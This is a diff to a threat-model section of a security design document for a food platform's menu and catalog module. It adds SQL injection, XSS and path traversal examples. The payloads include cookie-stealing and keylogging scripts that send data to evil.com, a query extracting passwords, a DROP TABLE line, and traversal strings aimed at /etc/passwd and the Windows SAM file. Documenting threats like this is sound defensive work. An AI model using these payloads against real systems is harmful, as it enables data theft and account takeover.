@@ -2,9 +2,17 @@
 
 ### 5.1 Potential Threats and Attacks
 
+The Menu & Catalog Module handles user-provided search queries and displays vendor-created content, making it a prime target for injection attacks. As this module is publicly accessible without authentication for browsing, it must be particularly robust against attacks that could compromise the entire system or affect other users.
+
 #### Threat 1: SQL Injection
 
 SQL Injection attacks occur when an attacker injects malicious SQL code through user input fields such as the search functionality. In the Menu & Catalog module, the search feature accepts user input to query menu items. Without proper protection, an attacker could input malicious SQL to extract sensitive data, modify records, or delete entire tables.
+
+**Technical Details:**
+- SQL injection is consistently ranked in the OWASP Top 10 security vulnerabilities
+- Attackers can use tools like sqlmap to automate SQL injection attacks
+- Successful attacks can lead to complete database compromise, including access to user credentials and payment information
+- Second-order SQL injection can occur when stored data is later used in queries without sanitization
 
 **Attack Scenario:**
 
@@ -17,9 +25,33 @@ SELECT * FROM menu_items WHERE name LIKE '%' OR '1'='1' --%'
 Result: Returns ALL menu items, bypassing the search filter
 ```
 
+**More Dangerous Variants:**
+```sql
+-- Data extraction
+' UNION SELECT username, password FROM users --
+
+-- Database destruction
+'; DROP TABLE menu_items; --
+
+-- Privilege escalation
+' OR 1=1; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --
+```
+
+**Impact if Unmitigated:**
+- Complete database access including user credentials
+- Data theft, modification, or deletion
+- Potential for lateral movement to other systems
+- Regulatory violations (PDPA, GDPR)
+
 #### Threat 2: Cross-Site Scripting (XSS)
 
-Cross-Site Scripting occurs when malicious JavaScript is injected into web pages viewed by other users. If a vendor enters malicious script code in menu item names or descriptions, that script could execute in customers' browsers, potentially stealing session cookies.
+Cross-Site Scripting occurs when malicious JavaScript is injected into web pages viewed by other users. If a vendor enters malicious script code in menu item names or descriptions, that script could execute in customers' browsers, potentially stealing session cookies or performing actions on behalf of the user.
+
+**Technical Details:**
+- Stored XSS (persistent) is particularly dangerous as it affects all users who view the malicious content
+- Reflected XSS occurs when user input is immediately echoed back without sanitization
+- DOM-based XSS manipulates the client-side DOM without server interaction
+- Modern browsers have some XSS protections, but they can often be bypassed
 
 **Attack Scenario:**
 
@@ -29,18 +61,50 @@ Menu item name: <script>document.location='https://evil.com/steal?cookie='+docum
 Without protection: Script executes and steals customer's session cookie
 ```
 
+**Advanced Attack Examples:**
+```html
+<!-- Keylogger injection -->
+<script>document.onkeypress=function(e){new Image().src='https://evil.com/log?k='+e.key;}</script>
+
+<!-- Form hijacking -->
+<script>document.forms[0].action='https://evil.com/capture';</script>
+
+<!-- Session hijacking via image tag -->
+<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
+```
+
+**Impact if Unmitigated:**
+- Session hijacking allowing account takeover
+- Phishing attacks appearing to come from trusted site
+- Malware distribution through trusted platform
+- Defacement of the website
+
 #### Threat 3: Path Traversal
 
-Path traversal attacks occur when an attacker manipulates file paths to access files outside the intended directory. In this module, image paths for menu items could be exploited to access sensitive system files.
+Path traversal attacks occur when an attacker manipulates file paths to access files outside the intended directory. In this module, image paths for menu items could be exploited to access sensitive system files or execute arbitrary code.
+
+**Technical Details:**
+- Also known as "directory traversal" or "dot-dot-slash" attacks
+- Attackers use sequences like `../` to navigate up the directory tree
+- Can be combined with null byte injection (`%00`) to bypass extension checks
+- Both Unix-style (`../`) and Windows-style (`..\`) traversal must be blocked
 
 **Attack Scenario:**
 
 ```
 Image path: ../../../etc/passwd
 Image path: ..\..\..\..\windows\system32\config\sam
+Image path: ....//....//....//etc/passwd (double encoding)
+Image path: ..%252f..%252f..%252fetc/passwd (URL encoding)
 
 Without protection: Attacker could read sensitive system files
 ```
+
+**Impact if Unmitigated:**
+- Access to sensitive configuration files (database credentials, API keys)
+- Reading system files like `/etc/passwd` or Windows SAM database
+- Potential for remote code execution if combined with file upload vulnerabilities
+- Information disclosure leading to further attacks
 
 ---
 
